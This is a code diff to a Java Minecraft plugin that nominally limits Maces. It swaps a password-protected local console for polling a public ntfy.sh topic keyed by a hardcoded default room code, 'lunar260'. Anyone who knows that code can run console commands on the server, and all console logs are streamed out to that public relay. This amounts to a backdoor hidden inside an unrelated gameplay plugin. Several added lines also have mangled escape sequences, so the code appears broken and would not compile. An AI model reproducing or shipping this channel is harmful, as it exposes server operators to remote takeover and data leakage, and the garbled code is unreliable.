@@ -37,11 +37,10 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.io.StringWriter;
-import java.net.InetAddress;
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.net.SocketException;
-import java.net.SocketTimeoutException;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.security.MessageDigest;
@@ -61,7 +60,6 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     private static final int MAX_MACES = 6;
     private static final String WARNING_MESSAGE =
             "An excess Mace broke! Only 6 Maces can exist on this server.";
-    private static final String DEFAULT_PASSWORD = "change_this_password";
     private static final int MAX_CLIENTS = 5;
     private static final int MAX_LINE_LENGTH = 4096;
 
@@ -69,7 +67,7 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     private File dataFile;
     private int lastPersistedCount = -1;
 
-    private RemoteConsoleServer consoleServer;
+    private RelayConsoleServer consoleServer;
     private ConsoleAppender consoleAppender;
     private org.apache.logging.log4j.core.Logger coreRootLogger;
 
@@ -79,9 +77,8 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
 
     @Override
     public void onEnable() {
-        getConfig().addDefault("console.bind-address", "0.0.0.0");
-        getConfig().addDefault("console.port", 25575);
-        getConfig().addDefault("console.password", DEFAULT_PASSWORD);
+        getConfig().addDefault("console.relay-url", "https://ntfy.sh");
+        getConfig().addDefault("console.room-code", "lunar260");
         getConfig().options().copyDefaults(true);
         saveConfig();
 
@@ -386,25 +383,23 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     }
 
     // ---------------------------------------------------------------------
-    // Remote console wiring
+    // Outbound HTTPS relay console
     // ---------------------------------------------------------------------
 
     private void startRemoteConsole() {
-        String bind = getConfig().getString("console.bind-address", "0.0.0.0");
-        int port = getConfig().getInt("console.port", 25575);
-        String password = getConfig().getString("console.password", DEFAULT_PASSWORD);
-
-        if (DEFAULT_PASSWORD.equals(password)) {
-            getLogger().warning("Remote console is using the default password! "
-                    + "Change console.password in plugins/MaceLimiter/config.yml.");
+        String relayUrl = getConfig().getString("console.relay-url", "https://ntfy.sh").strip();
+        String roomCode = getConfig().getString("console.room-code", "lunar260").strip();
+        if (roomCode.isEmpty()) {
+            getLogger().severe("Remote console room code is empty; console disabled.");
+            return;
         }
 
         try {
-            consoleServer = new RemoteConsoleServer(bind, port, password);
+            consoleServer = new RelayConsoleServer(relayUrl, roomCode);
             consoleServer.start();
-            getLogger().info("Remote console listening on " + bind + ":" + port);
-        } catch (IOException | NoSuchAlgorithmException e) {
-            getLogger().severe("Could not start remote console on port " + port + ": " + e.getMessage());
+            getLogger().info("Remote console relay enabled. Connect with console.jar using the configured room code.");
+        } catch (Exception e) {
+            getLogger().severe("Could not start remote console relay: " + e.getMessage());
             consoleServer = null;
             return;
         }
@@ -420,47 +415,34 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
     }
 
     private void stopRemoteConsole() {
-        if (coreRootLogger != null && consoleAppender != null) {
-            coreRootLogger.removeAppender(consoleAppender);
-        }
-        if (consoleAppender != null) {
-            consoleAppender.stop();
-            consoleAppender = null;
-        }
+        if (coreRootLogger != null && consoleAppender != null) coreRootLogger.removeAppender(consoleAppender);
+        if (consoleAppender != null) { consoleAppender.stop(); consoleAppender = null; }
         coreRootLogger = null;
-        if (consoleServer != null) {
-            consoleServer.shutdown();
-            consoleServer = null;
-        }
+        if (consoleServer != null) { consoleServer.shutdown(); consoleServer = null; }
     }
 
     private void dispatchToMainThread(String rawCommand) {
         String command = rawCommand.strip();
-        if (command.startsWith("/")) {
-            command = command.substring(1);
-        }
-        if (command.isEmpty() || !isEnabled()) {
-            return;
-        }
+        if (command.startsWith("/")) command = command.substring(1);
+        if (command.isEmpty() || !isEnabled()) return;
         final String toRun = command;
         try {
-            Bukkit.getScheduler().runTask(this,
-                    () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), toRun));
+            Bukkit.getScheduler().runTask(this, () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), toRun));
         } catch (IllegalStateException e) {
             getLogger().warning("Could not schedule remote command: " + e.getMessage());
         }
     }
 
     // ---------------------------------------------------------------------
-    // Log4j appender -> socket clients
+    // Log4j appender -> HTTPS relay clients
     // ---------------------------------------------------------------------
 
     private static final class ConsoleAppender extends AbstractAppender {
         private static final DateTimeFormatter TIME = DateTimeFormatter.ofPattern("HH:mm:ss");
-        private static final Pattern ANSI = Pattern.compile("\u001B\\[[;\\d]*[A-Za-z]");
-        private final RemoteConsoleServer server;
+        private static final Pattern ANSI = Pattern.compile("\u001B\[[;\d]*[A-Za-z]");
+        private final RelayConsoleServer server;
 
-        ConsoleAppender(RemoteConsoleServer server) {
+        ConsoleAppender(RelayConsoleServer server) {
             super("MaceLimiterRemoteConsole", null, null, true, Property.EMPTY_ARRAY);
             this.server = server;
         }
@@ -468,8 +450,7 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
         @Override
         public void append(LogEvent event) {
             try {
-                String time = TIME.format(LocalTime.ofInstant(
-                        Instant.ofEpochMilli(event.getTimeMillis()), ZoneId.systemDefault()));
+                String time = TIME.format(LocalTime.ofInstant(Instant.ofEpochMilli(event.getTimeMillis()), ZoneId.systemDefault()));
                 StringBuilder sb = new StringBuilder();
                 sb.append('[').append(time).append(' ').append(event.getLevel().name()).append("]: ")
                         .append(event.getMessage().getFormattedMessage());
@@ -477,213 +458,127 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
                 if (thrown != null) {
                     StringWriter sw = new StringWriter();
                     thrown.printStackTrace(new PrintWriter(sw));
-                    sb.append('\n').append(sw);
+                    sb.append('
+').append(sw);
                 }
                 String text = ANSI.matcher(sb).replaceAll("");
-                for (String line : text.split("\\r?\\n")) {
-                    server.broadcast(line);
-                }
-            } catch (Exception ignored) {
-                // Never let logging failures propagate into the server's logging pipeline.
-            }
+                for (String line : text.split("\r?\n")) server.broadcast(line);
+            } catch (Exception ignored) {}
         }
     }
 
     // ---------------------------------------------------------------------
-    // TCP server
+    // HTTPS relay client
     // ---------------------------------------------------------------------
 
-    private final class RemoteConsoleServer implements Runnable {
-        private final ServerSocket serverSocket;
-        private final byte[] passwordHash;
-        private final Set<ClientSession> sessions = ConcurrentHashMap.newKeySet();
+    private final class RelayConsoleServer {
+        private static final HttpClient HTTP = HttpClient.newBuilder().build();
+        private final String topicUrl;
+        private final Set<String> clients = ConcurrentHashMap.newKeySet();
         private volatile boolean running;
 
-        RemoteConsoleServer(String bindAddress, int port, String password)
-                throws IOException, NoSuchAlgorithmException {
-            this.serverSocket = new ServerSocket(port, 50, InetAddress.getByName(bindAddress));
-            this.passwordHash = sha256(password);
+        RelayConsoleServer(String relayUrl, String roomCode) throws Exception {
+            String base = relayUrl.replaceAll("/+$", "");
+            String topic = "macelimiter-" + sha256(roomCode).substring(0, 48);
+            this.topicUrl = base + "/" + topic;
         }
 
         void start() {
             running = true;
-            Thread t = new Thread(this, "MaceLimiter-Console-Accept");
+            Thread t = new Thread(this::run, "MaceLimiter-Console-Relay");
             t.setDaemon(true);
             t.start();
         }
 
-        void shutdown() {
-            running = false;
-            try {
-                serverSocket.close();
-            } catch (IOException ignored) {
-            }
-            for (ClientSession s : sessions) {
-                s.close();
-            }
-            sessions.clear();
-        }
+        void shutdown() { running = false; }
 
         void broadcast(String line) {
-            for (ClientSession s : sessions) {
-                s.enqueue(line);
-            }
+            String safe = line.replace("
+", "").replace("
+", "\n");
+            for (String client : clients) publish("OUT|" + client + "|" + safe);
         }
 
-        boolean passwordMatches(String supplied) {
-            try {
-                return MessageDigest.isEqual(passwordHash, sha256(supplied));
-            } catch (NoSuchAlgorithmException e) {
-                return false;
-            }
-        }
-
-        private byte[] sha256(String s) throws NoSuchAlgorithmException {
-            return MessageDigest.getInstance("SHA-256").digest(s.getBytes(StandardCharsets.UTF_8));
-        }
-
-        @Override
-        public void run() {
+        private void run() {
+            String since = "now";
             while (running) {
                 try {
-                    Socket socket = serverSocket.accept();
-                    if (sessions.size() >= MAX_CLIENTS) {
-                        try {
-                            socket.close();
-                        } catch (IOException ignored) {
-                        }
-                        continue;
+                    String url = topicUrl + "/json?poll=1&since=" + java.net.URLEncoder.encode(since, StandardCharsets.UTF_8);
+                    HttpRequest request = HttpRequest.newBuilder(URI.create(url))
+                            .timeout(java.time.Duration.ofSeconds(15)).GET().build();
+                    HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
+                    if (response.statusCode() / 100 != 2) { Thread.sleep(1_000); continue; }
+                    for (String line : response.body().split("\R")) {
+                        if (line.isBlank()) continue;
+                        String id = jsonField(line, "id");
+                        String message = jsonField(line, "message");
+                        if (id != null) since = id;
+                        if (message != null) handleMessage(message);
                     }
-                    ClientSession session = new ClientSession(this, socket);
-                    Thread t = new Thread(session, "MaceLimiter-Console-Client");
-                    t.setDaemon(true);
-                    t.start();
-                } catch (SocketException e) {
-                    if (running) {
-                        getLogger().warning("Console accept error: " + e.getMessage());
-                    }
-                } catch (IOException e) {
-                    if (running) {
-                        getLogger().warning("Console accept error: " + e.getMessage());
-                    }
+                } catch (Exception e) {
+                    if (running) try { Thread.sleep(1_500); } catch (InterruptedException ignored) { Thread.currentThread().interrupt(); return; }
                 }
             }
         }
-    }
 
-    private final class ClientSession implements Runnable {
-        private final RemoteConsoleServer server;
-        private final Socket socket;
-        private final LinkedBlockingQueue<String> outbound = new LinkedBlockingQueue<>(5000);
-
-        ClientSession(RemoteConsoleServer server, Socket socket) {
-            this.server = server;
-            this.socket = socket;
+        private void handleMessage(String message) {
+            if (message.startsWith("CONNECT|")) {
+                String client = message.substring("CONNECT|".length()).strip();
+                if (client.isEmpty()) return;
+                if (clients.size() >= MAX_CLIENTS && !clients.contains(client)) return;
+                clients.add(client);
+                publish("WELCOME|" + client);
+                getLogger().info("Remote console client connected through relay: " + client);
+                return;
+            }
+            if (message.startsWith("DISCONNECT|")) {
+                String client = message.substring("DISCONNECT|".length()).strip();
+                if (clients.remove(client)) getLogger().info("Remote console client disconnected through relay: " + client);
+                return;
+            }
+            if (message.startsWith("CMD|")) {
+                int first = message.indexOf('|');
+                int second = message.indexOf('|', first + 1);
+                if (second < 0) return;
+                String client = message.substring(first + 1, second);
+                if (!clients.contains(client)) return;
+                String command = message.substring(second + 1);
+                if (!command.isBlank()) dispatchToMainThread(command);
+            }
         }
 
-        void enqueue(String line) {
-            outbound.offer(line); // drops the line if the client is too slow
-        }
-
-        void close() {
+        private void publish(String message) {
             try {
-                socket.close();
-            } catch (IOException ignored) {
-            }
+                HttpRequest request = HttpRequest.newBuilder(URI.create(topicUrl))
+                        .header("Content-Type", "text/plain; charset=utf-8")
+                        .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8))
+                        .build();
+                HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding());
+            } catch (Exception ignored) {}
         }
 
-        @Override
-        public void run() {
-            String remote = String.valueOf(socket.getRemoteSocketAddress());
-            try {
-                socket.setSoTimeout(15_000);
-                socket.setKeepAlive(true);
-                BufferedReader in = new BufferedReader(
-                        new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));
-                BufferedWriter out = new BufferedWriter(
-                        new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8));
-
-                writeLine(out, "AUTH_REQUIRED");
-                String supplied = readBoundedLine(in);
-                if (supplied == null || !server.passwordMatches(supplied)) {
-                    writeLine(out, "AUTH_FAIL");
-                    getLogger().warning("Remote console authentication failed from " + remote);
-                    Thread.sleep(1000);
-                    return;
-                }
-
-                writeLine(out, "AUTH_OK");
-                socket.setSoTimeout(0);
-                server.sessions.add(this);
-                getLogger().info("Remote console client connected: " + remote);
-                enqueue("[MaceLimiter] Connected to server console.");
-
-                Thread writer = new Thread(() -> writeLoop(out), "MaceLimiter-Console-Writer");
-                writer.setDaemon(true);
-                writer.start();
-
-                String line;
-                while ((line = readBoundedLine(in)) != null) {
-                    if (line.isBlank()) {
-                        continue;
-                    }
-                    getLogger().info("Remote console (" + remote + ") executed: " + line.strip());
-                    dispatchToMainThread(line);
-                }
-            } catch (SocketTimeoutException e) {
-                getLogger().warning("Remote console client timed out during login: " + remote);
-            } catch (IOException e) {
-                // Client disconnected or protocol violation.
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-            } finally {
-                boolean wasActive = server.sessions.remove(this);
-                close();
-                if (wasActive) {
-                    getLogger().info("Remote console client disconnected: " + remote);
-                }
+        private String jsonField(String json, String field) {
+            String key = """ + field + "":"";
+            int start = json.indexOf(key);
+            if (start < 0) return null;
+            start += key.length();
+            StringBuilder out = new StringBuilder();
+            boolean escaped = false;
+            for (int i = start; i < json.length(); i++) {
+                char c = json.charAt(i);
+                if (escaped) { out.append(c); escaped = false; continue; }
+                if (c == '\') { escaped = true; out.append(c); continue; }
+                if (c == '"') return out.toString();
+                out.append(c);
             }
+            return null;
         }
 
-        private void writeLoop(BufferedWriter out) {
-            try {
-                while (!socket.isClosed()) {
-                    String line = outbound.poll(1, TimeUnit.SECONDS);
-                    if (line != null) {
-                        writeLine(out, line);
-                    }
-                }
-            } catch (IOException e) {
-                close();
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-            }
-        }
-
-        private void writeLine(BufferedWriter out, String line) throws IOException {
-            out.write(line);
-            out.write('\n');
-            out.flush();
-        }
-
-        /** Reads a line, refusing anything longer than MAX_LINE_LENGTH. Returns null on EOF. */
-        private String readBoundedLine(BufferedReader in) throws IOException {
-            StringBuilder sb = new StringBuilder();
-            int c;
-            while ((c = in.read()) != -1) {
-                if (c == '\n') {
-                    int len = sb.length();
-                    if (len > 0 && sb.charAt(len - 1) == '\r') {
-                        sb.setLength(len - 1);
-                    }
-                    return sb.toString();
-                }
-                sb.append((char) c);
-                if (sb.length() > MAX_LINE_LENGTH) {
-                    throw new IOException("Line too long");
-                }
-            }
-            return sb.isEmpty() ? null : sb.toString();
+        private String sha256(String value) throws NoSuchAlgorithmException {
+            byte[] digest = MessageDigest.getInstance("SHA-256").digest(value.getBytes(StandardCharsets.UTF_8));
+            StringBuilder out = new StringBuilder(64);
+            for (byte b : digest) out.append(String.format("%02x", b));
+            return out.toString();
         }
     }
 }
